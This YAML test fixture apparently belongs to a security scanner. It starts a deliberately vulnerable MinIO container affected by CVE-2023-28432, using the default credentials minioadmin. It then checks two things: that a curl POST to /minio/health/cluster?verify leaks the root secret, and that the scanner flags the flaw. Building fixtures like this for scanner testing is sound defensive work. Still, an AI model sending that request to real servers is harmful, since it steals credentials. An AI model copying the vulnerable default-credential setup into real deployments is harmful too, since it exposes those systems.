name: minio-env-disclosure
description: "MinIO server with CVE-2023-28432 — POST /minio/health/cluster?verify leaks MINIO_SECRET_KEY"
tags: [cve, minio, information-disclosure]

services:
  minio:
    image: minio/minio:RELEASE.2023-03-13T19-46-17Z
    ports: ["9272:9000"]
    command: ["server", "/data"]
    environment:
      MINIO_ROOT_USER: "minioadmin"
      MINIO_ROOT_PASSWORD: "minioadmin"

ready:
  cmd: "curl -sf http://localhost:9272/minio/health/live >/dev/null"
  timeout: 60s
  interval: 3s

assertions:
  - name: exploit-minio-env-leak
    type: command
    expect:
      command: "curl -sf -X POST 'http://localhost:9272/minio/health/cluster?verify' | grep -qi 'MINIO_ROOT_PASSWORD\\|MINIO_SECRET_KEY\\|minioadmin'"
      exit_code: 0

  - name: detects-minio-env-disclosure
    type: beacon
    target: localhost:9272
    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan", "--deep", "--permission-confirmed", "--ports", "9000"]
    expect:
      check_id: cve.minio_env_disclosure

timeout: 5m
